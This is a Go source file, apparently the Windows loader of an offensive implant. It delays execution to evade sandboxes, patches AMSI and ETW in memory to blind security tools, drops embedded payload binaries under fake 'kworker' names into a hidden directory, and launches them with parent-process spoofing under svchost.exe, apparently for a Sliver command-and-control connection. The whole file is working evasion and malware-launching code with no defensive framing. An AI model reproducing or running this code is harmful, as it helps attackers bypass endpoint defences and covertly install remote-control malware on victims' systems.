//go:build windows

package core

import (
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modntdll    = windows.NewLazySystemDLL("ntdll.dll")
	modamsi     = windows.NewLazySystemDLL("amsi.dll")

	procInitializeProcThreadAttributeList = modkernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = modkernel32.NewProc("UpdateProcThreadAttribute")
	procCreateProcess                     = modkernel32.NewProc("CreateProcessW")
)

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020002
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
	CREATE_NO_WINDOW                     = 0x08000000
	CREATE_UNICODE_ENVIRONMENT           = 0x00000400
	PROCESS_ALL_ACCESS                   = 0x000F0000 | 0x00100000 | 0xFFFF
)

type STARTUPINFOEX struct {
	windows.StartupInfo
	lpAttributeList uintptr
}

func Run(connString string) error {
	// 1. Initial Delay for Sandbox Evasion
	time.Sleep(10 * time.Second)

	// 2. Telemetry Blinding (AMSI & ETW Patching)
	patchAmsiEtw()

	// 3. Create Hidden Runtime Directory
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		localAppData = os.Getenv("TEMP")
	}
	
	workDir := filepath.Join(localAppData, fmt.Sprintf(".gs-%d", time.Now().UnixNano()))
	if err := os.MkdirAll(workDir, 0700); err != nil {
		return fmt.Errorf("failed to create work dir: %w", err)
	}
	defer os.RemoveAll(workDir)

	pathPtr, _ := windows.UTF16PtrFromString(workDir)
	windows.SetFileAttributes(pathPtr, windows.FILE_ATTRIBUTE_HIDDEN)

	// 4. Setup Named Pipe
	pipeName := fmt.Sprintf(`\\.\pipe\gs-%d`, time.Now().UnixNano())

	// 5. Extract Assets
	if err := extractAssets(workDir); err != nil {
		return err
	}

	// 6. Load Binaries
	nodePath := filepath.Join(workDir, "kworker-0.exe")
	if err := loadAssetToFile("node.gz", nodePath); err != nil {
		return err
	}
	
	payloadPath := filepath.Join(workDir, "kworker-1.exe")
	if err := loadAssetToFile("payload.gz", payloadPath); err != nil {
		return err
	}

	// 7. Find Parent Process for Spoofing (svchost.exe)
	ppid, _ := findProcessId("svchost.exe")

	// 8. Start Processes with PPID Spoofing
	fmt.Printf("[*] Spawning processes with PPID Spoofing (Parent PID: %d)...\n", ppid)
	
	nodeProc, err := startProcessSpoofed(nodePath, []string{nodePath, filepath.Join(workDir, "client.js"), connString}, workDir, ppid, "GS_NAMED_PIPE="+pipeName)
	if err != nil {
		return fmt.Errorf("failed to start node with spoofing: %w", err)
	}

	payloadProc, err := startProcessSpoofed(payloadPath, []string{payloadPath}, workDir, ppid, "SLIVER_NAMED_PIPE="+pipeName)
	if err != nil {
		windows.TerminateProcess(nodeProc, 0)
		return fmt.Errorf("failed to start payload with spoofing: %w", err)
	}

	// 9. Wait for completion
	windows.WaitForSingleObject(nodeProc, windows.INFINITE)
	windows.WaitForSingleObject(payloadProc, windows.INFINITE)

	windows.CloseHandle(nodeProc)
	windows.CloseHandle(payloadProc)

	return nil
}

func patchAmsiEtw() {
	// AMSI Patch (AmsiScanBuffer -> ret)
	amsiProc := modamsi.NewProc("AmsiScanBuffer")
	if amsiProc.Find() == nil {
		patchMemory(amsiProc.Addr(), []byte{0xC2, 0x18, 0x00}) // ret 18h
	}

	// ETW Patch (EtwEventWrite -> ret)
	etwProc := modntdll.NewProc("EtwEventWrite")
	if etwProc.Find() == nil {
		patchMemory(etwProc.Addr(), []byte{0xC3}) // ret
	}
}

func patchMemory(address uintptr, patch []byte) {
	var oldProtect uint32
	windows.VirtualProtect(address, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = b
	}
	windows.VirtualProtect(address, uintptr(len(patch)), oldProtect, &oldProtect)
}

func findProcessId(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil { return 0, err }
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	err = windows.Process32First(snapshot, &entry)
	for err == nil {
		if strings.EqualFold(windows.UTF16ToString(entry.ExeFile[:]), name) {
			return entry.ProcessID, nil
		}
		err = windows.Process32Next(snapshot, &entry)
	}
	return 0, fmt.Errorf("process not found")
}

func startProcessSpoofed(path string, args []string, dir string, ppid uint32, env string) (windows.Handle, error) {
	var si STARTUPINFOEX
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(si))
	
	if ppid > 0 {
		hParent, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, ppid)
		if err == nil {
			defer windows.CloseHandle(hParent)
			
			var size uintptr
			procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))
			
			buffer := make([]byte, size)
			si.lpAttributeList = uintptr(unsafe.Pointer(&buffer[0]))
			
			procInitializeProcThreadAttributeList.Call(si.lpAttributeList, 1, 0, uintptr(unsafe.Pointer(&size)))
			procUpdateProcThreadAttribute.Call(
				si.lpAttributeList,
				0,
				uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
				uintptr(unsafe.Pointer(&hParent)),
				uintptr(unsafe.Sizeof(hParent)),
				0,
				0,
			)
		}
	}

	var pi windows.ProcessInformation
	cmdLine, _ := windows.UTF16PtrFromString(strings.Join(args, " "))
	dirPtr, _ := windows.UTF16PtrFromString(dir)
	
	// Environment
	envVars := os.Environ()
	envVars = append(envVars, env)
	var envBlockStr string
	for _, v := range envVars {
		envBlockStr += v + "\x00"
	}
	envBlockStr += "\x00"
	envPtr, _ := windows.UTF16PtrFromString(envBlockStr)

	flags := uint32(CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT)
	
	r1, _, err := procCreateProcess.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0,
		0,
		1,
		uintptr(flags),
		uintptr(unsafe.Pointer(envPtr)),
		uintptr(unsafe.Pointer(dirPtr)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if r1 == 0 {
		return 0, err
	}
	
	windows.CloseHandle(pi.Thread)
	return pi.Process, nil
}

func loadAssetToFile(assetName, destPath string) error {
	f, err := Assets.Open("assets/" + assetName)
	if err != nil { return err }
	defer f.Close()

	gz, err := gzip.NewReader(f)
	if err != nil { return err }
	defer gz.Close()

	out, err := os.Create(destPath)
	if err != nil { return err }
	defer out.Close()

	pathPtr, _ := windows.UTF16PtrFromString(destPath)
	windows.SetFileAttributes(pathPtr, windows.FILE_ATTRIBUTE_HIDDEN)

	_, err = io.Copy(out, gz)
	return err
}
